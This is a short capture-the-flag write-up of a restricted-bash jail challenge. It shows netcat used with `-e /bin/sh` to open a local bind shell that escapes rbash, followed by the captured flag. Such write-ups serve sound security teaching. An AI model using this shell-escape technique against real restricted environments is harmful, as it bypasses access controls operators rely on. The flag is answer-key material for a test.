# Rbash Warmup
### JAIL - Easy

Welcome to the restricted shell! Demonstrate RCE on this rbash setup by running the /flag binary executable, and you will be awarded with the flag!
Connect via TCP:rbash-warmup.sdc.tf:1337

By k3v1n


## Solution

After testing available commands for this version of restricted bash, I saw that you can use `nc`. Great! I started server process in the background:
```shell
$ nc rbash-warmup.sdc.tf 1337
rbash-5.0$ nc -lv -p 4000 -s 127.0.0.1 -e /bin/sh & 

[1] 3
listening on [127.0.0.1] 4000 ...
```

Then I used `nc` again to connect to this server and use normal sh instead of restricted version:
```shell
rbash-5.0$ nc 127.0.0.1 4000
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58068

/flag
sdctf{nc--e-IS-r3aLLy-D4NG3R0U5!}
```

#### Flag: sdctf{nc--e-IS-r3aLLy-D4NG3R0U5!}
